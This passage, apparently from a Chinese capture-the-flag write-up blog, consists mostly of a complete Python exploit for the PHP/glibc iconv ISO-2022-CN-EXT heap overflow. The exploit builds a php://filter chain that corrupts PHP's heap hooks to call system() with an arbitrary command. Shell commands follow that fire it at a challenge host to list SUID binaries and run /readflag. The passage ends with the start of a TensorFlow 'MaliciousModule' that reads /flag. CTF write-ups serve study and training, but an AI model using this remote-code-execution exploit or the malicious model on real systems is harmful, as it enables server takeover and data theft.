LIBC_FILE = <span class="string">&quot;/dev/shm/cnext-libc&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># PHP&#x27;s heap  </span></span><br><span class="line">  </span><br><span class="line">        self.info[<span class="string">&quot;heap&quot;</span>] = self.heap <span class="keyword">or</span> self.find_main_heap(regions)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># Libc  </span></span><br><span class="line">  </span><br><span class="line">        libc = self._get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        self.download_file(libc.path, LIBC_FILE)  </span><br><span class="line">  </span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="literal">False</span>)  </span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>].address = libc.start  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region], *names: <span class="built_in">str</span></span>) -&gt; Region:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span>  </span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> regions:  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            failure(<span class="string">&quot;Unable to locate region&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> region  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">self, remote_path: <span class="built_in">str</span>, local_path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span>  </span><br><span class="line">        data = self.get_file(remote_path)  </span><br><span class="line">        Path(local_path).write(data)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region]</span>) -&gt; Region:  </span><br><span class="line">        <span class="comment"># Any anonymous RW region with a size superior to the base heap size is a  </span></span><br><span class="line">        <span class="comment"># candidate. The heap is at the bottom of the region.        heaps = [  </span></span><br><span class="line">            region.stop - HEAP_SIZE + <span class="number">0x40</span>  </span><br><span class="line">            <span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)  </span><br><span class="line">            <span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span>  </span><br><span class="line">            <span class="keyword">and</span> region.size &gt;= HEAP_SIZE  </span><br><span class="line">            <span class="keyword">and</span> region.stop &amp; (HEAP_SIZE - <span class="number">1</span>) == <span class="number">0</span>  </span><br><span class="line">            <span class="keyword">and</span> region.path <span class="keyword">in</span> (<span class="string">&quot;&quot;</span>, <span class="string">&quot;[anon:zend_alloc]&quot;</span>)  </span><br><span class="line">        ]  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> heaps:  </span><br><span class="line">            failure(<span class="string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        first = heaps[<span class="number">0</span>]  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:  </span><br><span class="line">            heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))  </span><br><span class="line">            msg_info(<span class="string">f&quot;Potential heaps: [i]<span class="subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            msg_info(<span class="string">f&quot;Using [i]<span class="subst">&#123;<span class="built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> first  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        self.check_vulnerable()  </span><br><span class="line">        self.get_symbols_and_addresses()  </span><br><span class="line">        self.exploit()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_exploit_path</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the  </span></span><br><span class="line"><span class="string">        other. Processing generally involves making some kind of operation either        on the chunk or in a destination chunk of the same size. Each operation is        applied on every single chunk; you cannot make PHP apply iconv on the first 10        chunks and leave the rest in place. That&#x27;s where the difficulties come from.  </span></span><br><span class="line"><span class="string">        Keep in mind that we know the address of the main heap, and the libraries.        ASLR/PIE do not matter here.  </span></span><br><span class="line"><span class="string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point        lower. For instance, we have the following free list:  </span></span><br><span class="line"><span class="string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00  </span></span><br><span class="line"><span class="string">        By triggering the bug from chunk ..900, we get:  </span></span><br><span class="line"><span class="string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???  </span></span><br><span class="line"><span class="string">        That&#x27;s step 3.  </span></span><br><span class="line"><span class="string">        Now, in order to control the free list, and make it point whereever we want,        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.        That&#x27;s step 2.  </span></span><br><span class="line"><span class="string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have        a problem: after step2 has been processed, the free list goes bottom-up, like:  </span></span><br><span class="line"><span class="string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900  </span></span><br><span class="line"><span class="string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates        chunks. When they get freed, they reverse the free list. Now step2 allocates in        reverse order, and therefore after step2, chunks are in the correct order.  </span></span><br><span class="line"><span class="string">        Another problem comes up.  </span></span><br><span class="line"><span class="string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.        Since step2 creates chunks that contain pointers and pointers are generally not        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.        To avoid this, we put the chunks in step2 at the very end of the chain, and        prefix them with `0\n`. When dechunked (right before the iconv), they will        &quot;disappear&quot; from the chain, preserving them from the character set conversion        and saving us from an unwanted processing error that would stop the processing        chain.  </span></span><br><span class="line"><span class="string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We        don&#x27;t know the precise layout of the heap, but we know that at the top of the        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.        Its free_slot[] array contains a pointer to each free list. By overwriting it,        we can make PHP allocate chunks whereever we want. In addition, its custom_heap        field contains pointers to hook functions for emalloc, efree, and erealloc        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and        then overwrite the use_custom_heap flag to make PHP use these function pointers        instead. We can now do our favorite CTF technique and get a call to        system(&lt;chunk&gt;).        We make sure that the &quot;system&quot; command kills the current process to avoid other        system() calls with random chunk data, leading to undefined behaviour.  </span></span><br><span class="line"><span class="string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the        process is in a random state, we still get contiguous, in order chunks for our        exploit.  </span></span><br><span class="line"><span class="string">        Therefore, the whole process described here CANNOT crash. Everything falls        perfectly in place, and nothing can get in the middle of our allocations.        &quot;&quot;&quot;</span>  </span><br><span class="line">        LIBC = self.info[<span class="string">&quot;libc&quot;</span>]  </span><br><span class="line">        ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]  </span><br><span class="line">        ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]  </span><br><span class="line">        ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]  </span><br><span class="line">  </span><br><span class="line">        ADDR_HEAP = self.info[<span class="string">&quot;heap&quot;</span>]  </span><br><span class="line">        ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span>  </span><br><span class="line">        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span>  </span><br><span class="line">  </span><br><span class="line">        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span>  </span><br><span class="line">  </span><br><span class="line">        CS = <span class="number">0x100</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># Pad needs to stay at size 0x100 at every step  </span></span><br><span class="line">        pad_size = CS - <span class="number">0x18</span>  </span><br><span class="line">        pad = <span class="string">b&quot;\x00&quot;</span> * pad_size  </span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)  </span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)  </span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)  </span><br><span class="line">        pad = compressed_bucket(pad)  </span><br><span class="line">  </span><br><span class="line">        step1_size = <span class="number">1</span>  </span><br><span class="line">        step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size  </span><br><span class="line">        step1 = chunked_chunk(step1)  </span><br><span class="line">        step1 = chunked_chunk(step1)  </span><br><span class="line">        step1 = chunked_chunk(step1, CS)  </span><br><span class="line">        step1 = compressed_bucket(step1)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to  </span></span><br><span class="line">        <span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;  </span></span><br><span class="line">        step2_size = <span class="number">0x48</span>  </span><br><span class="line">        step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)  </span><br><span class="line">        step2 = chunked_chunk(step2, CS)  </span><br><span class="line">        step2 = chunked_chunk(step2)  </span><br><span class="line">        step2 = compressed_bucket(step2)  </span><br><span class="line">  </span><br><span class="line">        step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)  </span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)  </span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr)  </span><br><span class="line">        step2_write_ptr = compressed_bucket(step2_write_ptr)  </span><br><span class="line">  </span><br><span class="line">        step3_size = CS  </span><br><span class="line">  </span><br><span class="line">        step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size  </span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS  </span><br><span class="line">        step3 = chunked_chunk(step3)  </span><br><span class="line">        step3 = chunked_chunk(step3)  </span><br><span class="line">        step3 = chunked_chunk(step3)  </span><br><span class="line">        step3 = compressed_bucket(step3)  </span><br><span class="line">  </span><br><span class="line">        step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG  </span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS  </span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)  </span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)  </span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)  </span><br><span class="line">        step3_overflow = compressed_bucket(step3_overflow)  </span><br><span class="line">  </span><br><span class="line">        step4_size = CS  </span><br><span class="line">        step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)  </span><br><span class="line">        step4 = chunked_chunk(step4)  </span><br><span class="line">        step4 = chunked_chunk(step4)  </span><br><span class="line">        step4 = chunked_chunk(step4)  </span><br><span class="line">        step4 = compressed_bucket(step4)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot  </span></span><br><span class="line">        <span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values        step4_pwn = ptr_bucket(  </span></span><br><span class="line">            <span class="number">0x200000</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="comment"># free_slot  </span></span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18  </span></span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            ADDR_HEAP,  <span class="comment"># 0x140  </span></span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            size=CS,  </span><br><span class="line">        )  </span><br><span class="line">  </span><br><span class="line">        step4_custom_heap = ptr_bucket(  </span><br><span class="line">            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span>  </span><br><span class="line">        )  </span><br><span class="line">  </span><br><span class="line">        step4_use_custom_heap_size = <span class="number">0x140</span>  </span><br><span class="line">  </span><br><span class="line">        COMMAND = self.command  </span><br><span class="line">        COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span>  </span><br><span class="line">        <span class="keyword">if</span> self.sleep:  </span><br><span class="line">            COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;self.sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span>  </span><br><span class="line">        COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">assert</span> (  </span><br><span class="line">                <span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size  </span><br><span class="line">        ), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span>  </span><br><span class="line">        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        step4_use_custom_heap = COMMAND  </span><br><span class="line">        step4_use_custom_heap = qpe(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)  </span><br><span class="line">  </span><br><span class="line">        pages = (  </span><br><span class="line">                step4 * <span class="number">3</span>  </span><br><span class="line">                + step4_pwn  </span><br><span class="line">                + step4_custom_heap  </span><br><span class="line">                + step4_use_custom_heap  </span><br><span class="line">                + step3_overflow  </span><br><span class="line">                + pad * self.pad  </span><br><span class="line">                + step1 * <span class="number">3</span>  </span><br><span class="line">                + step2_write_ptr  </span><br><span class="line">                + step2 * <span class="number">2</span>  </span><br><span class="line">        )  </span><br><span class="line">  </span><br><span class="line">        resource = compress(compress(pages))  </span><br><span class="line">        resource = b64(resource)  </span><br><span class="line">        resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        filters = [  </span><br><span class="line">            <span class="comment"># Create buckets  </span></span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 0: Setup heap  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 1: Reverse FL order  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 2: Put fake pointer and make FL order back to normal  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 3: Trigger overflow  </span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap  </span></span><br><span class="line">            <span class="string">&quot;convert.quoted-printable-decode&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,  </span><br><span class="line">        ]  </span><br><span class="line">        filters = <span class="string">&quot;|&quot;</span>.join(filters)  </span><br><span class="line">        path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> path  </span><br><span class="line">  </span><br><span class="line"><span class="meta">    @inform(<span class="params"><span class="string">&quot;Triggering...&quot;</span></span>)  </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        path = self.build_exploit_path()  </span><br><span class="line">        start = time.time()  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            self.remote.send(path)  </span><br><span class="line">        <span class="keyword">except</span> (ConnectionError, ChunkedEncodingError):  </span><br><span class="line">            <span class="keyword">pass</span>  </span><br><span class="line">  </span><br><span class="line">        msg_print()  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.sleep:  </span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)  </span><br><span class="line">        <span class="keyword">elif</span> start + self.sleep &lt;= time.time():  </span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="comment"># Wrong heap, maybe? If the exploited suggested others, use them!  </span></span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_print()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    <span class="comment"># Remove 2-byte header and 4-byte checksum  </span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    payload = base64.encode(data)  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):  </span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> payload.encode()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.  </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:  </span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size  </span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))  </span><br><span class="line">    bucket = qpe(bucket)  </span><br><span class="line">    bucket = chunked_chunk(bucket)  </span><br><span class="line">    bucket = chunked_chunk(bucket)  </span><br><span class="line">    bucket = chunked_chunk(bucket)  </span><br><span class="line">    bucket = compressed_bucket(bucket)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> bucket  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the  </span></span><br><span class="line"><span class="string">    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    &quot;&quot;&quot;</span>    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than  </span></span><br><span class="line">    <span class="comment"># enough    if size is None:  </span></span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span>  </span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)  </span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@dataclass  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    start: <span class="built_in">int</span>  </span><br><span class="line">    stop: <span class="built_in">int</span>  </span><br><span class="line">    permissions: <span class="built_in">str</span>  </span><br><span class="line">    path: <span class="built_in">str</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">    @property  </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:  </span><br><span class="line">        <span class="keyword">return</span> self.stop - self.start  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">Exploit()</span><br></pre></td></tr></table></figure><p>由于权限不足, 不能直接读flag, 且不出网, 无写权限,</p><p>直接看一下suid, 把输出写到&#x2F;tmp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py &quot;https://eci-2zefy6ftjjeuuqjqwyee.cloudeci1.ichunqiu.com:80/&quot; &quot; find / -user root -perm -4000 -print 2&gt;/dev/null &gt;/tmp/a&quot;</span><br></pre></td></tr></table></figure><p>可以看见&#x2F;readflag有suid</p><p><img src="https://gagjcxhxrb.feishu.cn/space/api/box/stream/download/asynccode/?code=OTAwY2FjMDM1OGU1ZWU2YTIyNDBmNmM3MWM5MjczMDZfalkxUFgwSUNsdkphQlZCYTl0aXo0OVo2OEJ6SERCWWNfVG9rZW46Tk5HS2JBd3ZBb3JuVEt4TUpnRWNiaHFSbnFiXzE3NTc5MjcxOTc6MTc1NzkzMDc5N19WNA"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit33.py &quot;https://eci-2zefy6ftjjeuuqjqwyee.cloudeci1.ichunqiu.com:80/&quot; &quot;/readflag &gt;/tmp/a&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gagjcxhxrb.feishu.cn/space/api/box/stream/download/asynccode/?code=MjRhOTMxMjc1ZDg3NDZjM2QyNjEwYWY5NWE0MWEzMWRfYm51Z1paeG9zMXF6SFFrbVoyNWNDb3VoTGVOR0JDQ1RfVG9rZW46U1pWY2JZajF6b3FVTXh4clZJRmNaQUZhbnZlXzE3NTc5MjcxOTc6MTc1NzkzMDc5N19WNA"></p><h2 id="Mini-modelscope"><a href="#Mini-modelscope" class="headerlink" title="Mini-modelscope"></a>Mini-modelscope</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MaliciousModule</span>(tf.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment"># __init__ 不执行任何文件 I/O</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @tf.function(<span class="params">input_signature=[tf.TensorSpec(<span class="params">shape=[<span class="number">1</span>,<span class="number">1</span>], dtype=tf.float32</span>)]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">serve</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># 使用 TensorFlow 原生文件读取</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = tf.io.read_file(<span class="string">&quot;/flag&quot;</span>)  <span class="comment"># 返回 tf.string</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag = tf.constant(<span class="string">&quot;FLAG_NOT_FOUND&quot;</span>)</span><br><span class="line">        <span class="comment"># 返回 shape=(1,) 的 tensor</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;prediction&quot;</span>: tf.reshape(flag, [<span class="number">1</span>])&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 保存模型 ====</span></span><br><span class="line">model = MaliciousModule()</span><br><span 